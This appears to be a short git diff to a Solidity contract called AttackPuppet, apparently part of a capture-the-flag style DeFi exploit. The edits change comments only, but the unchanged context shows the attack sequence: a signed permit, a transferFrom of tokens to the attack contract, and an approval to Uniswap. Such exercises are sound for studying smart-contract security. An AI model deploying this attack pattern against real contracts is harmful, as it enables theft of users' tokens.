@@ -34,7 +34,7 @@ contract AttackPuppet {
 
         uint tokenAmount = abi.decode(data, (uint256));
         uint deadline = type(uint).max;
-        //approve
+        //permit to attackContract
         tokenAddress.functionCall(
             abi.encodeWithSignature(
                 "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
@@ -47,7 +47,7 @@ contract AttackPuppet {
                 s
             )
         );
-        //transfer
+        //transfer to attackContract
         tokenAddress.functionCall(
             abi.encodeWithSignature(
                 "transferFrom(address,address,uint256)",
@@ -56,7 +56,7 @@ contract AttackPuppet {
                 tokenAmount
             )
         );
-
+        //approve to uniswap
         tokenAddress.functionCall(
             abi.encodeWithSignature(
                 "approve(address,uint256)",
